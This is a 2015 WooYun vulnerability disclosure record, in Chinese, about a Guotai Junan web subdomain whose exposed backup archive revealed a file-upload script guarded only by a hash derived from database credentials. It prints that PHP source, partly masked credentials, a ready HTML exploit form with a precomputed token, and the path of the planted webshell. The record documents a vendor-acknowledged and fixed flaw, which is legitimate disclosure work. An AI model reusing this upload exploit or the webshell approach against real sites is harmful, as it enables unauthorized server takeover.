{"id": 65757, "wybug_id": "wooyun-2015-0141185", "wybug_title": "国泰君安某站信息泄露导致getshell", "wybug_corp": "国泰君安", "wybug_author": "路人甲", "wybug_date": "2015-09-14 23:16", "wybug_open_date": "2015-10-10 11:10", "wybug_type": "重要敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述：  详细说明：  backup : http://nx.gtja.com/web.rar审计代码:web/base/appfile.php\n<?phpdefine(\"ROOTPATH\", \"../\");include(ROOTPATH.\"includes/common.inc.php\");set_time_limit(0);//密钥校验$k=md5(strrev($dbUser.$dbPass));$h=$_SERVER[\"HTTP_REFERER\"];$t=$_POST[\"t\"];$m=$_POST[\"m\"];$act=$_POST[\"act\"];$path=$_POST[\"path\"];$md5=md5($k.$t);if($m!=$md5){\techo \"ERROR: 安全性校验错误\";\texit;}//文件上传if($act==\"upload\"){\t\t$file=$_FILES[\"file\"];\t\t$r_size=$_POST[\"r_size\"];\t\tif ($_FILES[\"file\"][\"ERROR\"] > 0){\t\t  echo \"ERROR:\".$_FILES[\"file\"][\"ERROR\"];\t\t  exit;\t\t}else{\t\t\tif($_FILES[\"file\"][\"size\"]!=$r_size){\t\t\t\techo \"ERROR:上传文件错误，文件大小和原文件不匹配\";\t\t\t\t@write_log(\"app.log\",date(\"Y-m-d H:i:s\",time()).\" ERROR: 上传文件错误，文件大小和原文件不匹配\\n\",FILE_APPEND);\t\t\t\texit;\t\t\t}\t\t\t//检查目录名\t\t\t$ToPath=\"../effect/source/bg\";\t\t\t$Tofile=$ToPath.\"/\".$_FILES[\"file\"][\"name\"];\t\t\t\t\t\t\t\t\tif(!is_writable($ToPath)){\t\t\t\techo \"ERROR:\".$ToPath.\" 目录不可写，请设置目录属性为可写\";\t\t\t\t@write_log(\"app.log\",date(\"Y-m-d H:i:s\",time()).\" ERROR: \".$ToPath.\" 目录不可写，请设置目录属性为可写\\n\",FILE_APPEND);\t\t\t\texit;\t\t\t}\t\t\tif(file_exists($Tofile) && !is_writable($Tofile)){\t\t\t\techo \"ERROR:\".$Tofile.\" 文件不能覆盖，请设置文件属性为可写\";\t\t\t\t@write_log(\"app.log\",date(\"Y-m-d H:i:s\",time()).\" ERROR: \".$Tofile.\" 文件不能覆盖，请设置文件属性为可写\\n\",FILE_APPEND);\t\t\t\texit;\t\t\t}\t\t\t\t\t\t//复制文件\t\t\tcopy($_FILES[\"file\"][\"tmp_name\"],$Tofile);\t\t\t\t\t\tswitch($_FILES[\"file\"][\"type\"]){\t\t\t\t\t\t\tcase \"application/octet-stream\":\t\t\t\t\t@chmod($Tofile,0755);\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\t@chmod($Tofile,0666);\t\t\t\tbreak;\t\t\t}\t\t\techo \"OK\";\t\t\t@write_log(\"app.log\",date(\"Y-m-d H:i:s\",time()).\" 安装成功: \".$Tofile.\"\\n\",FILE_APPEND);\t\t\texit;\t\t}}function write_log($logfile,$logtext,$mode){\tif(intval(substr(phpversion(),0,1))>=5){\t\t@file_put_contents($logfile,$logtext,$mode);\t}else{\t\t$fp = fopen($logfile,\"a\");\t\tfwrite($fp,$logtext);\t\tfclose($fp);\t}}?>\n   漏洞证明：  \n$dbHost=\"localhost\";$dbName=\"gtj***\";$dbUser=\"gtj***\";$dbPass=\"12****21\";\nexp:\n<html><form action=\"http://nx.gtja.com/base/appfile.php\" method=\"post\" enctype=\"multipart/form-data\">    <input name=\"r_size\" id=\"r_size\" value=\"269\" />    <input name=\"t\" id=\"t\" value=\"1\" />    <input name=\"m\" id=\"m\" value=\"c23afc0eeee3d2d86e1aacf411fcb623\" />    <input name=\"act\" id=\"act\" value=\"upload\" />    <input type=\"file\" name=\"file\" id=\"file\" />    <input type=\"submit\" /></form></html>\nwebshell:http://nx.gtja.com/effect/source/bg/search.php   修复方案：  删 改   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-09-16 16:45 厂商回复： 谢谢提醒。 最新状态： 2015-10-10：已经修复。谢谢 2015-10-10：非关键应用  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}